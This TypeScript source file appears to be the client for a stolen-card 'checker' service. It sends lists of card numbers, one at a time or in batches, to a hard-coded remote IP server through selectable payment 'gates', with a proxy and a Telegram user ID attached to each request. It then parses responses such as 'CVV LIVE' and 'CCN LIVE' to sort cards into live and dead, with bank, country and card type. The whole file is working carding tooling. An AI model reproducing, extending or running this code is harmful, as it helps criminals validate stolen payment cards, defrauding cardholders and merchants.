import axios, { AxiosError } from 'axios';

const baseURL = 'http://178.16.142.134:6969';

interface CheckCardParams {
  card: string;
  gate: string;
  proxy: string | null;
  telegramId: string;
}

interface CardCheckResponse {
  status: 'LIVE' | 'DEAD';
  message: string;
  card: string;
  details: {
    status: string;
    gateway: string;
    bank: string;
    timeTaken: string;
    cardType?: string;
    country?: string;
    statusMessage?: string;
  };
}

interface BatchCheckParams {
  cards: string[];
  gate: string;
  proxy: string | null;
  telegramId: string;
  onProgress?: (result: CardCheckResponse) => void;
  onCardProcessed?: (card: string) => void;
}

const api = axios.create({
  baseURL: baseURL,
  timeout: 3600000,
  maxBodyLength: Infinity,
  maxContentLength: Infinity
});

api.interceptors.response.use(
  (response) => response,
  (error: AxiosError) => {
    if (axios.isAxiosError(error)) {
      if (error.code === 'ECONNABORTED') {
        throw new Error('Request timed out');
      }

      if (!error.response) {
        throw new Error('Network error');
      }

      switch (error.response.status) {
        case 429:
          throw new Error('Too many requests. Please try again later.');
        case 403:
          throw new Error('Access denied');
        case 404:
          throw new Error('Service not found');
        case 500:
          throw new Error('Server error');
        default:
          // Fixed: Convert response.data to string if it's an object
          const errorMessage = typeof error.response.data === 'object' 
            ? JSON.stringify(error.response.data)
            : error.response.data?.toString() || 'An error occurred';
          throw new Error(errorMessage);
      }
    }
    throw error;
  }
);


const parseCardResponse = (responseText: string): {
  status: string;
  gateway: string;
  bank: string;
  timeTaken: string;
  cardType?: string;
  country?: string;
  statusMessage?: string;
} => {
  const isApproved = responseText.includes('𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅') || 
                     responseText.includes('𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅') ||
                     responseText.includes('CVV LIVE') ||
                     responseText.includes('CCN LIVE') ||
                     responseText.includes('Thank');
  
  const isDeclined = responseText.includes('𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌') || 
                     responseText.includes('DECLINED ❌');
  
  // Extract all information using regex
  const gatewayMatch = responseText.match(/𝗚𝗮𝘁𝗲𝘄𝗮𝘆:.*?([^<]+)/);
  const bankMatch = responseText.match(/𝗕𝗮𝗻𝗸:.*?([^<]+)/);
  const timeMatch = responseText.match(/𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻.*?(\d+\.\d+)/);
  const cardTypeMatch = responseText.match(/𝗖𝗮𝗿𝗱 𝗧𝘆𝗽𝗲:.*?([^<]+)/);
  const countryMatch = responseText.match(/𝗖𝗼𝘂𝗻𝘁𝗿𝘆:.*?([^<]+)/);
  const statusMatch = responseText.match(/𝗦𝘁𝗮𝘁𝘂𝘀:.*?([^<]+)/);

  return {
    status: isApproved ? 'APPROVED' : isDeclined ? 'DECLINED' : 'ERROR',
    gateway: gatewayMatch?.[1]?.trim() || 'Unknown',
    bank: bankMatch?.[1]?.trim() || 'Unknown',
    timeTaken: timeMatch ? `${timeMatch[1]}s` : '0s',
    cardType: cardTypeMatch?.[1]?.trim(),
    country: countryMatch?.[1]?.trim(),
    statusMessage: statusMatch?.[1]?.trim()
  };
};

export const cardService = {
  async checkSingleCard({ card, gate, proxy, telegramId }: CheckCardParams): Promise<CardCheckResponse> {
    try {
      const response = await api.get(`/${gate.toLowerCase()}`, {
        params: {
          lista: card,
          sec: proxy,
          cst: telegramId,
        },
      });

      const responseText = response.data;
      const isApproved = responseText.includes('𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅') || 
                        responseText.includes('𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅') ||
                        responseText.includes('CVV LIVE') ||
                        responseText.includes('CCN LIVE') ||
                        responseText.includes('Thank');
      const isDeclined = responseText.includes('𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌');
      const details = parseCardResponse(responseText);

      return {
        status: isApproved ? 'LIVE' : 'DEAD',
        message: responseText,
        card,
        details
      };
    } catch (error) {
      if (axios.isAxiosError(error)) {
        throw new Error(error.response?.data || error.message);
      }
      throw error;
    }
  },

  async checkBatch({ cards, gate, proxy, telegramId, onProgress, onCardProcessed }: BatchCheckParams): Promise<CardCheckResponse[]> {
    const uniqueCards = [...new Set(cards)];
    const results: CardCheckResponse[] = [];

    for (const card of uniqueCards) {
      try {
        const response = await this.checkSingleCard({ card, gate, proxy, telegramId });
        results.push(response);
        
        if (onProgress) {
          onProgress(response);
        }
        if (onCardProcessed) {
          onCardProcessed(card);
        }
      } catch (error) {
        const errorResponse: CardCheckResponse = {
          status: 'DEAD',
          message: error instanceof Error ? error.message : 'Unknown error',
          card,
          details: {
            status: 'ERROR',
            gateway: 'Error',
            bank: 'Error',
            timeTaken: '0s'
          }
        };
        results.push(errorResponse);
        
        if (onProgress) {
          onProgress(errorResponse);
        }
        if (onCardProcessed) {
          onCardProcessed(card);
        }
      }
    }

    return results;
  },

  async updateStats(userId: string, processedCount: number) {
    try {
      await fetch('/api/update-stats', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          userId,
          processedCount,
        }),
      });
    } catch (error) {
      console.error('Failed to update stats:', error);
    }
  },

  clearProcessedCards() {
    // This can stay empty or be removed
  },

  getQueueStatus() {
    return {
      processedCount: 0,
    };
  },

  clearQueue() {
    // This can stay empty or be removed
  },
};